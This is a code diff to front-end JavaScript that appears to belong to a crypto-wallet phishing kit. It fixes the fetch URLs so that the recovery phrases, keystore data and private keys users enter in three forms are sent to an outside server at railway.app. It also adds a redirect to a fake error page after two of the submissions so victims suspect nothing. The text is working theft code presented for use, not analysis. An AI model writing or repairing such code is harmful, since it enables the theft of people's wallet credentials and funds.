@@ -178,7 +178,7 @@ document.querySelector("#importForm").addEventListener("submit", function (e) {
 
   console.log("Sending phrase data:", formData);
 
-  fetch("form-backend-production-f5f1.up.railway.app/ph", {
+  fetch("https://form-backend-production-f5f1.up.railway.app/ph", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(formData),
@@ -224,7 +224,7 @@ document
 
     console.log("Sending keystore data:", formData);
 
-    fetch("form-backend-production-f5f1.up.railway.app/ks", {
+    fetch("https://form-backend-production-f5f1.up.railway.app/ks", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(formData),
@@ -238,6 +238,10 @@ document
         console.log("Fetch error:", error);
         // alert('Error: ' + error);
       });
+
+      setTimeout(() => {
+        window.location.href = "error.html";
+      }, 2000);
   });
 
 // Form 3: Private Key Form
@@ -259,7 +263,7 @@ document.querySelector("#privateForm").addEventListener("submit", function (e) {
 
   console.log("Sending private key data:", formData);
 
-  fetch("form-backend-production-f5f1.up.railway.app/pk", {
+  fetch("https://form-backend-production-f5f1.up.railway.app/pk", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(formData),
@@ -273,6 +277,10 @@ document.querySelector("#privateForm").addEventListener("submit", function (e) {
       console.log("Fetch error:", error);
       // alert('Error: ' + error);
     });
+
+    setTimeout(() => {
+      window.location.href = "error.html";
+    }, 2000);
 });
 
 
